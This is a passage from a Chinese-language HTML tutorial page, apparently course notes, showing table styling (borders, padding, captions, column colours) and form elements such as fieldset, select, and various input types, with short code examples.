class="name">td</span>&gt;</span>28<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="边框线"><a href="#边框线" class="headerlink" title="边框线"></a>边框线</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">       <span class="selector-tag">table</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">           <span class="attribute">border-collapse</span>: collapse; </span></span><br><span class="line">       &#125;</span><br><span class="line"><span class="css">       <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line">       &#125;</span><br><span class="line"><span class="css">       <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="css">           <span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line">       &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>  border-collapse: collapse;    #为表格设置合并边框模型</p>
<hr>
<h1 id="标题-lt-caption-gt"><a href="#标题-lt-caption-gt" class="headerlink" title="标题&lt; caption&gt;"></a>标题&lt; caption&gt;</h1><p>显示效果：给列表&lt;table&gt;加一个标题</p>
<hr>
<h1 id="表格内边距"><a href="#表格内边距" class="headerlink" title="表格内边距"></a>表格内边距</h1><p>padding</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">table</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">          <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">          <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="selector-tag">caption</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="设置-lt-th-gt-元素的背景"><a href="#设置-lt-th-gt-元素的背景" class="headerlink" title="设置&lt; th&gt;元素的背景"></a>设置&lt; th&gt;元素的背景</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">table</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">          <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="comment">/* 将 th 元素的背景色设置为 grey */</span> </span></span><br><span class="line"><span class="css">      <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">background</span>: grey;</span></span><br><span class="line"><span class="css">          <span class="attribute">color</span>: white;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line"><span class="css">          <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="selector-tag">caption</span> &#123;</span></span><br><span class="line"><span class="css">          <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="lt-thead-gt-lt-tbody-gt-lt-tfoot-gt"><a href="#lt-thead-gt-lt-tbody-gt-lt-tfoot-gt" class="headerlink" title="&lt; thead&gt;   /  &lt; tbody&gt;   /  &lt; tfoot&gt;"></a>&lt; thead&gt;   /  &lt; tbody&gt;   /  &lt; tfoot&gt;</h1><p>使用方法：例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>外号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>原名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>特长<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span>照片<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="跨行"><a href="#跨行" class="headerlink" title="跨行"></a>跨行</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>强化体格<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上意思为跨两行</p>
<h1 id="设置不同列的颜色"><a href="#设置不同列的颜色" class="headerlink" title="设置不同列的颜色"></a>设置不同列的颜色</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 将第 1 列的背景颜色设置为红色 --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 将第 2、3 列的背景颜色设置为绿色 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">colgroup</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">col</span> <span class="attr">style</span>=<span class="string">&quot;background: red&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">col</span> <span class="attr">span</span>=<span class="string">&quot;2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background: green&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">colgroup</span>&gt;</span></span><br></pre></td></tr></table></figure>




<hr>
<h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span>&gt;</span>重写<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">formmethod</span>=<span class="string">&quot;get&quot;</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">formmethod</span>=<span class="string">&quot;post&quot;</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="lt-label-gt"><a href="#lt-label-gt" class="headerlink" title="&lt;label&gt;"></a>&lt;label&gt;</h2><p>该标签不会显示样式，但是具有隐式关联作用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>你叫什么名字：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>你叫什么名字：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="lt-fieldset-gt"><a href="#lt-fieldset-gt" class="headerlink" title="&lt;fieldset&gt;"></a>&lt;fieldset&gt;</h2><p>将表单分组</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;welcome.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 使用fieldset划分不同类型的表单元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;age&quot;</span>&gt;</span>年龄：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>为了给您提供更好的服务，希望您能抽出几分钟时间，将您的感受和建议告诉我们，我们非常重视每位用户的宝贵意见，期待您的参与！现在我们就马上开始吧！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;q1&quot;</span>&gt;</span>您是否使用过鱼C论坛：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;q2&quot;</span>&gt;</span>您使用鱼C论坛的目的是：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;q3&quot;</span>&gt;</span>您使用鱼C论坛的频率是：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="lt-legend-gt"><a href="#lt-legend-gt" class="headerlink" title="&lt;legend&gt;"></a>&lt;legend&gt;</h2><p>分组命名</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">legend</span>&gt;</span>基本信息<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;age&quot;</span>&gt;</span>年龄：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="lt-select-gt-lt-option-gt"><a href="#lt-select-gt-lt-option-gt" class="headerlink" title="&lt; select&gt;   &lt;option&gt;"></a>&lt; select&gt;   &lt;option&gt;</h2><p>建立选项</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>性别：</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="lt-optgroup-gt"><a href="#lt-optgroup-gt" class="headerlink" title="&lt;optgroup&gt;"></a>&lt;optgroup&gt;</h2><p>选项分组</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;《零基础入门学习Web开发》&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;h5017&quot;</span>&gt;</span>第017讲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;h5016&quot;</span>&gt;</span>第016讲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;h5015&quot;</span>&gt;</span>第015讲<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;h5000&quot;</span>&gt;</span>……<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="&lt;input&gt;"></a>&lt;input&gt;</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重写&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;msg()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点我！&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong>单选框</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong>多选框</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>你最喜欢的漫威英雄是？<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Deadpool&quot;</span>&gt;</span>死侍</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Venom&quot;</span>&gt;</span>毒液</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;BlackWidow&quot;</span>&gt;</span>黑寡妇</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Hulk&quot;</span>&gt;</span>绿巨人</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;GreenTurtle&quot;</span>&gt;</span>小甲鱼</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;IronMan&quot;</span>&gt;</span>钢铁侠</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Wolverine&quot;</span>&gt;</span>金刚狼</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;heros[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CaptainAmerica&quot;</span>&gt;</span>美国队长</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong>日期时间</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>时间：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>日期：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;date&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>年月：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;month&quot;</span> <span class="attr">name</span>=<span class="string">&quot;month&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>星期：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;week&quot;</span> <span class="attr">name</span>=<span class="string">&quot;week&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>本地日期和时间：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datetime-local&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>实现搜索框</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>实现颜色选择框</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>实现图像按钮</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;turtle.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Green Turtle&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">隐藏<span class="tag">&lt;<span class="name">input</span>&gt;</span>元素</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">value</span>=<span class="string">&quot;你看我不到&quot;</span> <span class="attr">disabled</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>限制数字输入</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">min</span>=<span class="string">&quot;1&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">step</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">inout</span>&gt;</span>实现数字滚动条</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;range&quot;</span> <span class="attr">name</span>=<span class="string">&quot;love&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">min</span>=<span class="string">&quot;1&quot;</span> <span class="attr">max</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">step</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>邮箱、手机、网址</span><br><span class="line">邮箱：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">手机：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;tel&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tel&quot;</span>&gt;</span>&lt;</span><br><span class="line">网址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">网址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;^((https|http)?:\/\/)[^\s]+&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;仅限以http和https开头的网址&quot;</span> <span class="attr">required</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;22&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>&lt;input&gt;实现多文件上传，且规定上传文件格式</p>
